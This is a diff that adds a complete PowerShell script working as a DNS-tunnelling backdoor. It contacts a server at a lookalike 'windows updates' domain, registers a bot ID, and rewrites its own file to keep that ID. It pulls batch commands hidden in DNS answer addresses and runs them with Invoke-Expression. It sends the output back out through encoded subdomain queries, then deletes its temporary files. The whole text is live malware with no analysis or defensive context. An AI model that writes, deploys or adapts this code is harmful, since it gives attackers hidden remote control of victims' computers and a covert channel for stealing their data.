@@ -1,0 +1,156 @@
+$global:myhost = '.winodwsupdates.me'
+$global:filename = ''
+$global:myflag = 0
+$global:myid = '###'
+$global:myhome = "$env:Public\Libraries\"
+function convertTo-Base36 ($decNum="")
+{
+    $decNum %= 46656
+    $alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    do
+    {
+        $remainder = ($decNum % 36)
+        $char = $alphabet.substring($remainder,1)
+        $base36Num = "$char$base36Num"
+        $decNum = ($decNum - $remainder) / 36
+    }
+    while ($decNum -gt 0)
+    $base36Num.PadLeft(3,'0')
+}
+function GetSub($myflag2, $cmdid='00', $partid='000')
+{
+    if($myflag2 -eq 0)
+    {
+    ('00000000'+(convertTo-Base36(Get-Random -Maximum 46655)))
+    }
+    elseif($myflag2 -eq 1)
+    {
+        ('00'+$global:myid+'00000'+(convertTo-Base36(Get-Random -Maximum 46655)))
+    }
+    elseif($myflag2 -eq 2)
+    {
+        ('00'+$global:myid+$cmdid+$partid+(convertTo-Base36(Get-Random -Maximum 46655)))
+    }
+}
+function Str2Hex($mystr)
+{
+    [System.BitConverter]::ToString([System.Text.Encoding]::Default.GetBytes($mystr)).Replace("-", "")
+}
+function Alive
+{
+	if($global:myid -eq '#'+'##')
+	{
+		return 0
+	}
+    SendReceiveDNS ((GetSub 1)+'30')
+    $sub = ((GetSub 1)+'232A') + (Str2Hex $global:filename)
+    $i = 1
+    $ret = 0
+    while($global:myflag -eq 1)
+    {
+        $ret = 1
+        $sub2 = $sub + (Str2Hex $i)
+        SendReceiveDNS $sub2
+        $i++
+    }
+    if($ret -eq 1)
+    {
+        FixBatFile ($global:myhome+'tp\'+$global:filename+".bat")
+    }
+    $ret
+}
+function SendReceiveDNS ($d)
+{
+	$cnt = 0
+	while ($cnt -lt 20)
+	{
+		try
+		{
+			$mydata = ([System.Net.DNS]::GetHostByName($d+$global:myhost).AddressList[0])
+			$mydata = ($mydata | ForEach-Object {$_.IPAddressToString})
+			$cnt = 25
+		}
+		catch
+		{
+			Start-Sleep -m 500
+			$cnt++
+		}
+	}
+    if(-not($cnt -eq 25))
+    {
+        ('#'+'##')
+    }
+    elseif($global:myflag -eq 0 -and $mydata.StartsWith('33.33.'))
+    {
+        $tmp = $mydata.SubString(6).Split('.')
+        $global:filename = ([char] [int] $tmp[0]) + ([char] [int] $tmp[1])
+        $global:myflag = 1
+    }
+    elseif ($mydata.Equals('35.35.35.35'))
+    {
+        $global:myflag = 0
+    }
+    elseif ($global:myflag -eq 1)
+    {
+        $tmp = $mydata.Split('.')
+        [System.IO.File]::AppendAllText($global:myhome+'tp\'+$global:filename+".bat", (([char] [int] $tmp[0]) + ([char] [int] $tmp[1]) + ([char] [int] $tmp[2]) + ([char] [int] $tmp[3])))
+    }
+    elseif($global:myid -eq '#'+'##')
+    {
+        ([char] [int] $mydata.Split('.')[0])
+    }
+}
+function FixBatFile ($batpath)
+{
+    (Get-Content $batpath).Substring(10) | Set-Content $batpath
+}
+function SendFile($myFilePath)
+{
+    $myFileName = [System.IO.Path]::GetFileNameWithoutExtension($myFilePath)
+    $mystr = [System.IO.File]::ReadAllText($myFilePath)
+    $i=0
+    $mytemp = ''
+    $j=0
+    while($i -le $mystr.Length)
+    {
+        $mytemp += $mystr[$i]
+        if((($i%24) -eq 23) -or ($i -eq $mystr.Length))
+        {
+            $myhex = Str2Hex $mytemp
+            SendReceiveDNS ((GetSub 2 $myFileName (convertTo-Base36 $j)) + $myhex)
+            $j++
+            $mytemp = ''
+        }
+        $i++
+    }
+}
+function GetID
+{
+    $global:myid = SendReceiveDNS ((GetSub 0)+'30')
+}
+function ChangeThisFile ($botid)
+{
+	(Get-Content $env:Public\Libraries\dns.ps1) -replace ('#'+'##'),$botid | Set-Content $env:Public\Libraries\dns.ps1
+}
+function Init
+{
+    if($global:myid -eq ('#'+'##'))
+    {
+		md -Force ($global:myhome+'tp\')
+		GetID
+		ChangeThisFile $global:myid
+    }
+}
+function main
+{
+    Init
+    if(Alive -eq 1)
+    {
+        Invoke-Expression ($global:myhome+'tp\'+$global:filename+'.bat > '+$global:myhome+'tp\'+$global:filename+'.txt')
+        SendFile ($global:myhome+'tp\'+$global:filename+'.txt')
+        Remove-Item ($global:myhome+'tp\'+$global:filename+'.bat')
+        Remove-Item ($global:myhome+'tp\'+$global:filename+'.txt')
+    }
+}
+main
+
